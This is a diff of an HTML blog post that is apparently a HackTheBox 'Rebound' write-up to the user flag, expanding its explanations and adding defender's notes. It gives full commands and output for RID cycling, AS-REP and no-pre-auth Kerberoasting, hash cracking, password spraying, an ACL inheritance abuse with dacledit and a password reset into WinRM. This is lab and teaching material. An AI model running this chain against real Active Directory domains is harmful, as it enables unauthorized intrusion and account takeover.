@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HackTheBox: Rebound — Satej Chaudhari</title>
-  <meta name="description" content="HackTheBox Rebound walkthrough (to the user flag) — a RID-brute user list feeds a no-pre-auth Kerberoast, a cracked service ticket is reused, and a BloodHound chain of group self-add and forced ACL inheritance resets a service account for the user flag.">
+  <meta name="description" content="In-depth HackTheBox Rebound walkthrough (to the user flag) — RID cycling, an AS-REP roast into a no-pre-auth Kerberoast, password reuse, and a BloodHound ACL chain of group self-add and forced OU inheritance, fully explained.">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
 
@@ -61,75 +61,101 @@
         <h1 class="post-title">HackTheBox: Rebound</h1>
         <p class="post-meta">
           <time datetime="2026-10-02">2026-10-02</time>
-          <span>&middot; 13 min read</span>
+          <span>&middot; 15 min read</span>
         </p>
       </header>
 
       <div class="post-body">
 
-        <p><strong>Rebound</strong> is a hard Active Directory box (<code>rebound.htb</code>). A RID-brute user list feeds a no-pre-auth Kerberoast, a cracked service ticket is reused across accounts, and a BloodHound-guided chain — group self-add, then forcing ACL inheritance down an OU with <code>dacledit</code> — resets a service account for the user flag. <em>This writeup covers the box up to the user flag.</em></p>
+        <p><strong>Rebound</strong> is a hard Active Directory box, and this writeup takes it to the <strong>user flag</strong>. The theme is Kerberos: a RID-brute user list feeds an <a href="../theory/2026-08-18-asrep-roasting.html">AS-REP roast</a> that unlocks a password-free <a href="../theory/2026-08-18-kerberoasting.html">Kerberoast</a>, a cracked service ticket is reused across accounts, and a two-step <a href="../theory/2026-08-18-acls-dacls.html">ACL</a> chain — joining a group, then forcing an ACE to inherit down an OU — resets a service account we can log in as.</p>
+
+        <h2>Attack chain at a glance</h2>
+
+        <ul>
+          <li><strong>Recon</strong> — full DC port set on <code>rebound.htb</code>; guest can read <code>IPC$</code>/<code>Shared</code>.</li>
+          <li><strong>User list</strong> — RID cycling through the guest session enumerates every account.</li>
+          <li><strong>Kerberos</strong> — <code>jjones</code> has pre-auth disabled (<a href="../theory/2026-08-18-asrep-roasting.html">AS-REP roastable</a>); using it as a no-pre-auth principal, <a href="../theory/2026-08-18-kerberoasting.html">Kerberoast</a> the SPN accounts and crack <code>ldap_monitor</code>.</li>
+          <li><strong>Reuse</strong> — that password is reused by <code>oorend</code> (spray).</li>
+          <li><strong>ACL chain</strong> — oorend self-adds to <code>ServiceMgmt</code> (GenericAll over the <em>Service Users</em> OU); force an inheritable ACE down the OU with <code>dacledit</code>, then reset <code>winrm_svc</code>; WinRM in for the user flag.</li>
+        </ul>
 
         <h2>Reconnaissance</h2>
 
-        <pre><code>nmap -Pn -p- -sC -sV 10.129.232.31
+        <pre><code>ports=$(nmap -Pn -p- --min-rate=10000 -T4 10.129.232.31 | grep ^[0-9] | cut -d / -f1 | paste -sd,)
+nmap -Pn -p$ports -sC -sV 10.129.232.31
 
-88/tcp  kerberos-sec   (domain: rebound.htb, dc01.rebound.htb)
+88/tcp  kerberos-sec   Domain: rebound.htb, DC01
 389/tcp ldap
-445/tcp microsoft-ds
-5985/tcp http          WinRM</code></pre>
+445/tcp microsoft-ds   (signing: True, required)
+5985/tcp http          WinRM
+|_ clock-skew: mean: 7h00m16s     &lt;- fix clock skew before Kerberos</code></pre>
 
-        <h2>SMB &amp; RID enumeration</h2>
+        <blockquote>A seven-hour clock skew will break every Kerberos request (<code>KRB_AP_ERR_SKEW</code>). Sync to the DC first — e.g. <code>sudo ntpdate 10.129.232.31</code> or <code>faketime</code> — or nothing below works.</blockquote>
 
-        <p>Guest can read a couple of shares (nothing useful in them) but, importantly, can still be used to cycle RIDs and recover the full user list:</p>
+        <h2>Enumeration — RID cycling for users</h2>
 
-        <pre><code>ridenum 10.129.232.31 500 20000 Guest &#x27;&#x27;
+        <p>Guest can bind to SMB but the readable shares are empty. The win is that a null/guest session is still enough to walk the RID space: domain SIDs are sequential, so cycling RIDs from 500 upward resolves each one to an account name. That hands over the full user list with no credentials:</p>
+
+        <pre><code>netexec smb 10.129.232.31 -u guest -p &#x27;&#x27; --shares     # IPC$, Shared readable (empty)
+
+ridenum 10.129.232.31 500 20000 Guest &#x27;&#x27;
 Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
-  Administrator  Guest  krbtgt  DC01$  ppaul  llune  fflock
-  jjones  mmalone  nnoon  ldap_monitor  oorend  winrm_svc
-  batch_runner  tbrady  delegator$</code></pre>
+  Administrator  Guest  krbtgt  DC01$
+  ppaul  llune  fflock  jjones  mmalone  nnoon
+  ldap_monitor  oorend  winrm_svc  batch_runner  tbrady  delegator$</code></pre>
 
-        <h2>AS-REP + no-pre-auth Kerberoast</h2>
+        <h2>Kerberos — AS-REP roast into a no-pre-auth Kerberoast</h2>
 
-        <p>An AS-REP roast across the list shows <code>jjones</code> has pre-authentication disabled:</p>
+        <p>With a user list and no passwords, the first thing to test is pre-authentication. Any account with <em>&ldquo;Do not require Kerberos pre-authentication&rdquo;</em> set can have an AS-REP requested and cracked offline. Here <code>jjones</code> is flagged:</p>
 
         <pre><code>impacket-GetNPUsers -usersfile reboundusers.txt rebound.htb/ -dc-ip 10.129.232.31
-$krb5asrep$23$jjones@REBOUND.HTB:...</code></pre>
+...
+$krb5asrep$23$jjones@REBOUND.HTB:bd423d7c...&lt;hash&gt;...
+[-] &lt;everyone else&gt; doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</code></pre>
 
-        <p>Because <code>jjones</code> needs no pre-auth, it can be used as the requesting principal to Kerberoast <em>without a password</em> (<code>-no-preauth</code>), which returns service tickets for several accounts:</p>
+        <p>The jjones AS-REP does not crack — but it does not need to. An account that requires no pre-authentication can act as the <em>requesting</em> principal for a TGS request without proving its own password. Impacket's <code>GetUserSPNs -no-preauth</code> uses exactly that trick to <a href="../theory/2026-08-18-kerberoasting.html">Kerberoast</a> every SPN account in the domain, entirely unauthenticated:</p>
 
-        <pre><code>impacket-GetUserSPNs -no-preauth jjones -usersfile reboundusers.txt -dc-host 10.129.232.31 rebound.htb/
-$krb5tgs$...ldap_monitor...
-$krb5tgs$...delegator...
-$krb5tgs$...DC01$...</code></pre>
+        <pre><code>impacket-GetUserSPNs -no-preauth jjones -usersfile reboundusers.txt \
+  -dc-host 10.129.232.31 rebound.htb/
+$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$...
+$krb5tgs$18$*DC01$...
+$krb5tgs$18$*delegator$...
+$krb5tgs$18$*krbtgt$...</code></pre>
 
-        <p>The <code>ldap_monitor</code> ticket cracks against rockyou:</p>
+        <p>The RC4 (etype 23) ticket for <code>ldap_monitor</code> is the crackable one; the AES (etype 18) tickets for machine accounts are not worth the effort. Hashcat mode <code>13100</code> is TGS-REP:</p>
 
-        <pre><code>hashcat -m 13100 ldap_monitor_hash rockyou.txt
-$krb5tgs$23$*ldap_monitor$REBOUND.HTB$...:1GR8t@$$4u</code></pre>
+        <pre><code>hashcat -m 13100 ldap_monitor_hash /usr/share/wordlists/rockyou.txt
+$krb5tgs$23$*ldap_monitor$REBOUND.HTB$...:1GR8t@$$4u
+Status...........: Cracked</code></pre>
 
         <h2>Password reuse → oorend</h2>
 
-        <p>The password authenticates as <code>ldap_monitor</code>, and a BloodHound collection runs over LDAP with Kerberos. Spraying that same password across the user list shows it is reused by <code>oorend</code>:</p>
+        <p><code>ldap_monitor</code> authenticates over SMB, and a Kerberos/LDAP bind works too, so a full BloodHound collection runs. Reused passwords are the oldest AD sin, so spray the recovered one across the whole user list — <code>oorend</code> shares it:</p>
 
-        <pre><code>nxc smb 10.129.232.31 -u reboundusers.txt -p &#x27;1GR8t@$$4u&#x27; --continue-on-success
+        <pre><code>nxc smb 10.129.232.31 -u ldap_monitor -p &#x27;1GR8t@$$4u&#x27;
+[+] rebound.htb\ldap_monitor:1GR8t@$$4u
+
+nxc ldap 10.129.232.31 -d rebound.htb -u ldap_monitor -p &#x27;1GR8t@$$4u&#x27; \
+  --bloodhound --collection All -k --dns-server 10.129.232.31
+
+nxc smb 10.129.232.31 -u reboundusers.txt -p &#x27;1GR8t@$$4u&#x27; --continue-on-success
 [+] rebound.htb\ldap_monitor:1GR8t@$$4u
 [+] rebound.htb\oorend:1GR8t@$$4u</code></pre>
 
         <figure>
           <img src="../assets/img/htb-rebound/img1.png" alt="BloodHound path from oorend through ServiceMgmt to the Service Users OU">
-          <figcaption>BloodHound: <code>oorend</code> → <code>ServiceMgmt</code> → GenericAll over the Service Users OU.</figcaption>
+          <figcaption>BloodHound: <code>oorend</code> can join <code>ServiceMgmt</code>, which has GenericAll over the <em>Service Users</em> OU that contains <code>winrm_svc</code>.</figcaption>
         </figure>
 
-        <h2>Group self-add + forced ACL inheritance → user flag</h2>
+        <h2>ACL chain — group self-add, then forced inheritance</h2>
 
-        <p>oorend can add itself to the <code>ServiceMgmt</code> group, which has full control over the <code>Service Users</code> OU:</p>
+        <p>BloodHound reveals a two-hop path. First, <code>oorend</code> can add itself to the <code>ServiceMgmt</code> group, and that group has full control over the <code>Service Users</code> OU:</p>
 
-        <pre><code>powerview rebound.htb/oorend:...@dc01.rebound.htb ...
-Add-DomainGroupMember -Identity &quot;SERVICEMGMT&quot; -Members oorend</code></pre>
+        <pre><code>powerview rebound.htb/oorend:&#x27;1GR8t@$$4u&#x27;@dc01.rebound.htb --web
+Add-DomainGroupMember -Identity &quot;SERVICEMGMT&quot; -Members oorend
+[+] User oorend successfully added to SERVICEMGMT</code></pre>
 
-        <blockquote>Full control over an <em>OU</em> is not automatically full control over the <em>users</em> inside it — those ACEs are not inherited by default. But with full control over the OU you can add a new ACE that <em>is</em> marked inheritable, so it trickles down to the child objects. The clean, OPSEC-safe route here is Shadow Credentials via Certipy; this writeup took the simpler password-reset path.</blockquote>
-
-        <p>Use Impacket's <code>dacledit</code> to write an inheritable FullControl ACE on the OU, which then applies to <code>winrm_svc</code>:</p>
+        <p>The catch is inheritance. Full control over an <em>OU</em> does not automatically mean full control over the <em>user objects</em> inside it — by default those child objects do not inherit the OU's ACEs. But because we control the OU, we can add a new ACE and mark it <em>inheritable</em>, so it flows down to the objects beneath, including <code>winrm_svc</code>. Impacket's <code>dacledit</code> writes exactly that inheritable FullControl ACE:</p>
 
         <pre><code>impacket-getTGT &#x27;rebound.htb&#x27;/&#x27;oorend&#x27;:&#x27;1GR8t@$$4u&#x27; -dc-ip rebound.htb
 export KRB5CCNAME=oorend.ccache
@@ -137,15 +163,30 @@ export KRB5CCNAME=oorend.ccache
 dacledit.py -k -no-pass -action write -rights FullControl \
   -principal oorend -target-dn &#x27;OU=Service Users,DC=rebound,DC=htb&#x27; \
   -inheritance &#x27;rebound.htb&#x27;/&#x27;oorend&#x27; -use-ldaps -dc-ip rebound.htb
+[*] DACL backed up to dacledit-...bak
 [*] DACL modified successfully!</code></pre>
 
-        <p>With inherited control over <code>winrm_svc</code>, reset its password and WinRM in for the user flag:</p>
+        <blockquote>The clean, OPSEC-safe way to abuse control over a user is <a href="../theory/2026-09-24-shadow-credentials-pkinit.html">Shadow Credentials</a> — write a certificate to <code>msDS-KeyCredentialLink</code> and authenticate via PKINIT, which never changes the victim's password. This writeup took the simpler, louder route of a direct password reset; in a real engagement prefer the certificate path.</blockquote>
+
+        <p>With inherited control over <code>winrm_svc</code>, reset its password and use the WinRM service it is named for to grab the user flag:</p>
 
         <pre><code>bloodyAD -d rebound.htb -k --host dc01.rebound.htb set password winrm_svc &#x27;Password@1&#x27;
+[+] Password changed successfully!
+
 evil-winrm -i dc01.rebound.htb -u winrm_svc -p &#x27;Password@1&#x27;
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; type user.txt</code></pre>
 
-        <blockquote>That is the user flag. The path to root continues from the <code>delegator$</code> ticket and a Shadow-Credentials/Certipy step against the DC — out of scope for this writeup, which stops at user.</blockquote>
+        <blockquote>That is the user flag. From here root continues via the <code>delegator$</code> ticket recovered earlier and a <a href="../theory/2026-09-24-shadow-credentials-pkinit.html">Shadow-Credentials / Certipy</a> step against the DC — out of scope for this writeup, which stops at user as requested.</blockquote>
+
+        <h2>Defender's notes</h2>
+
+        <ul>
+          <li>Disable guest/null SMB so RID cycling cannot harvest your user list.</li>
+          <li>Never set <em>&ldquo;do not require pre-authentication&rdquo;</em> (<a href="../theory/2026-08-18-asrep-roasting.html">AS-REP roasting</a>); it also enables the no-pre-auth Kerberoast pivot used here.</li>
+          <li>Give service accounts long, random passwords (25+ chars) so Kerberoast tickets are uncrackable, and prefer gMSAs (<a href="../theory/2026-08-18-kerberoasting.html">Kerberoasting</a>).</li>
+          <li>Forbid password reuse across accounts.</li>
+          <li>Audit control over OUs and groups; remember inheritance can be toggled on by anyone with write access to the OU's DACL (<a href="../theory/2026-08-18-acls-dacls.html">ACLs & DACLs</a>).</li>
+        </ul>
 
       </div>
     </article>
